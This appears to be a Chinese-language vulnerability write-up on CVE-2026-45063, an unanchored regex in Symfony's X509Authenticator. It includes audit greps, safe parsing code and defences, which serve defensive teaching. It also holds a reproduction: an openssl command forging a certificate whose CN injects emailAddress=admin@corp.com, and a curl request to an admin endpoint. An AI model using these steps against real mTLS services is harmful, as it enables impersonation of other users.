🎯 漏洞概述

CVE-2026-45063 (CVSS 9.1)：Symfony框架的X509Authenticator在从mTLS客户端证书的DN（Distinguished Name）中提取emailAddress字段时，使用了一个没有锚定的正则表达式。攻击者可以构造一个CN字段包含emailAddress=victim@corp.com的证书，正则会错误地匹配到CN中的伪造emailAddress，而非真正的emailAddress字段——从而以任意用户身份通过认证。

🐱 核心洞察：一个^字符的缺失，价值9.1分 nya~

📋 X.509 DN 与正则提取

X.509证书的DN（Distinguished Name）格式如下：

CN=Alice Smith, OU=Engineering, O=Corp, emailAddress=alice@corp.com

注意关键点：各RDN之间用逗号分隔，但字段值本身可以包含逗号和等号！

开发者通常用正则从DN字符串中提取特定字段：

// Symfony的X509Authenticator源码
preg_match('/emailAddress=([^,]+)/', $dn, $matches);
$email = $matches[1];

看起来没问题？往下看 👇

🐛 漏洞根因：缺少锚定

正则表达式默认在字符串中任意位置匹配。没有^锚定的正则，会从左到右扫描整个字符串，找到第一个匹配就返回。

正常场景：

DN: "CN=Alice Smith, OU=Engineering, emailAddress=alice@corp.com"
正则: /emailAddress=([^,]+)/
匹配结果: alice@corp.com ✅

攻击场景：

DN: "CN=emailAddress=victim@corp.com, OU=Fake, emailAddress=attacker@evil.com"
正则: /emailAddress=([^,]+)/
匹配结果: victim@corp.com ❌ (匹配了CN中的伪造值！)

攻击者只需要控制证书的CN字段，在其中注入emailAddress=目标用户，正则就会优先匹配到CN中的值，而真正的emailAddress字段被跳过。

⚡ 攻击构造与复现

Step 1: 生成恶意证书

# 生成包含伪造emailAddress的CN的证书
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
  -days 365 -nodes \
  -subj "/CN=emailAddress=admin@corp.com/O=FakeOrg"

Step 2: 使用恶意证书认证

# 向目标发送mTLS请求
curl --cert cert.pem --key key.pem https://target.internal/api/admin

Step 3: 服务器端解析链

// 服务器收到证书，提取DN
$dn = $_SERVER['SSL_CLIENT_S_DN'];
// DN值: "CN=emailAddress=admin@corp.com, O=FakeOrg"

// 正则提取email（错误地匹配了CN中的值）
preg_match('/emailAddress=([^,]+)/', $dn, $matches);
$email = $matches[1]; // "admin@corp.com" ← 被骗了！

// 系统认为你是admin@corp.com → 认证通过

⚡ 整个攻击不需要破解任何密码学算法——纯粹是字符串解析的逻辑缺陷！

🔍 审计代码示例

在代码审计中，快速定位所有从结构化字符串中用正则提取字段的代码：

# 搜索所有从DN/路径/header中提取字段的正则
grep -rn "preg_match.*=.*\[" --include="*.php" .
grep -rn "re\.findall.*=" --include="*.py" .
grep -rn "RegExp.*=" --include="*.js" .

# 特别关注mTLS相关代码
grep -rn "SSL_CLIENT\|X509\|certificate\|client_cert" --include="*.php" .

不安全的写法（缺少锚定）：

// ❌ 危险：没有锚定
preg_match('/emailAddress=([^,]+)/', $dn, $m);

// ❌ 危险：只锚定了开头，但DN可能从任意字段开始
preg_match('/^.*emailAddress=([^,]+)/', $dn, $m);

安全的写法：

// ✅ 方案1：先按逗号分割，再逐字段匹配
$parts = str_getcsv($dn, ',');
foreach ($parts as $part) {
    if (preg_match('/^\s*emailAddress=(.+)$/', trim($part), $m)) {
        $email = $m[1];
        break;
    }
}

// ✅ 方案2：使用专用DN解析库
use Symfony\Component\Ldap\Entry;  // 或 phpseclib
// 由库正确处理字段边界

🛡️ 防御方案

1. 永远不要用正则从结构化字符串中提取字段
使用专用解析库（如Symfony Ldap、OpenSSL X509 parse）。

2. 如果必须用正则，先分割再匹配
按字段分隔符分割后，对每个字段单独做^field=(.+)$锚定匹配。

3. 验证字段值的合法性
email字段应该通过filter_var(FILTER_VALIDATE_EMAIL)验证。

4. 最小权限原则
即使email提取正确，也要验证该email确实存在于系统中且有权访问目标资源。

🌀 通用攻击模型

这个漏洞模式远不止于X.509 DN——所有从结构化字符串中用正则提取字段的场景都可能受影响：

场景 结构化字符串 攻击手法
mTLS证书认证 X.509 DN CN注入emailAddress
LDAP认证 LDAP DN路径 OU注入CN=admin
SAML属性映射 Assertion XML NameID字段注入
JWT claim解析 JSON payload 嵌套claim覆盖
AWS IAM ARN arn:aws:iam::... 路径段注入role名

🐱 记住：结构化字符串的"解析"不等于"提取"——提取需要精确锚定字段边界，否则就是越界提取 nya~
